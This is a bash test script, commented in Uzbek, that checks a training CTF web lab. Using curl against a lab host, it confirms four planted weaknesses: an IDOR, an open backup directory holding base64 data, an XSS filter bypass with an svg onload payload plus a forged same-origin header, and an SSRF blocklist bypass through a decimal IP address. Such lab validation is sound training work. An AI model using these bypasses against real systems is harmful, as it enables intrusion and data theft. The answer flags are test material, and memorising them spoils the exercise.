#!/bin/bash
# ctf-web «Nimbus Reports» — 4 web zaiflikni attacker konteyneridan tekshiradi.
# Ishlatish: platform (yoki lab) stack ko'tarilgach:  bash test-ctf.sh
# Eslatma: XSS'ning BRAUZERDA bajarilishi alohida (Playwright) tekshiriladi;
# bu skript WAF + reflection + flag.php guard'ni curl bilan tasdiqlaydi.
set -u
A="docker exec ejpt-attacker sh -c"
T="http://10.10.20.60"
pass=0; fail=0
chk(){ if echo "$2" | grep -q "$1"; then echo "  [PASS] $3"; pass=$((pass+1)); else echo "  [FAIL] $3 -- got: $(echo "$2"|tr '\n' ' '|cut -c1-100)"; fail=$((fail+1)); fi; }

echo "### 0) discovery — endpointlar javob beradi (gobuster -x php,txt topadi)"
OUT=$($A "for p in download.php search.php fetch.php admin-metrics.php flag.php storage-backup/ ; do curl -s -o /dev/null -w '%{http_code} ' $T/\$p ; done")
echo "    codes (download/search/fetch/admin-metrics/flag/storage-backup): $OUT"
chk "200" "$OUT" "asosiy endpointlar tirik"

echo "### 1) IDOR — download.php (report_id=0 via Burp)"
I=$($A "curl -s -X POST -d 'report_id=0' $T/download.php")
chk "EJPT{id0r" "$I" "report_id=0 -> flag"
ND=$($A "curl -s -X POST -d 'report_id=3' $T/download.php")
chk "Monthly Summary" "$ND" "report_id=3 -> oddiy report (0 emas, bir xil)"

echo "### 2) Information disclosure — open dir -> base64"
B64=$($A "curl -s $T/storage-backup/nimbus_db_2024-01-15.sql.txt | grep -oE 'base64\\): [A-Za-z0-9+/=]+' | awk '{print \$2}'")
DEC=$($A "echo '$B64' | base64 -d 2>/dev/null")
chk "EJPT{3nc0d3d" "$DEC" "storage-backup base64 dekod -> flag"

echo "### 3) Reflected XSS (jim filtr) + flag.php guard"
NAIVE=$($A "curl -s '$T/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E'")
if echo "$NAIVE" | grep -q '<script>alert'; then echo "  [FAIL] naive <script> jim filtrlanmadi"; fail=$((fail+1)); else echo "  [PASS] naive <script> jim filtrlanadi (banner yo'q)"; pass=$((pass+1)); fi
REF=$($A "curl -s '$T/search.php?q=%3Csvg%20onload%3Dalert(1)%3E'")
chk "<svg onload=alert(1)>" "$REF" "<svg onload> -> reflected (unescaped, bypass)"
FD=$($A "curl -s -o /dev/null -w '%{http_code}' $T/flag.php")
chk "403" "$FD" "flag.php to'g'ridan -> 403 (same-origin kerak)"
FG=$($A "curl -s -H 'Sec-Fetch-Site: same-origin' $T/flag.php")
chk "EJPT{w4f_byp4ss" "$FG" "flag.php same-origin -> XSS flag"

echo "### 4) SSRF + decimal-IP bypass — fetch.php"
BL=$($A "curl -s '$T/fetch.php?url=http://127.0.0.1/admin-metrics.php'")
chk "reach that link" "$BL" "127.0.0.1 -> generic error (blocklist, banner yo'q)"
SS=$($A "curl -s '$T/fetch.php?url=http://2130706433/admin-metrics.php'")
chk "EJPT{ssrf_d3c1m4l" "$SS" "decimal 2130706433 -> admin-metrics flag"

echo ""
echo "### NATIJA: PASS=$pass  FAIL=$fail"
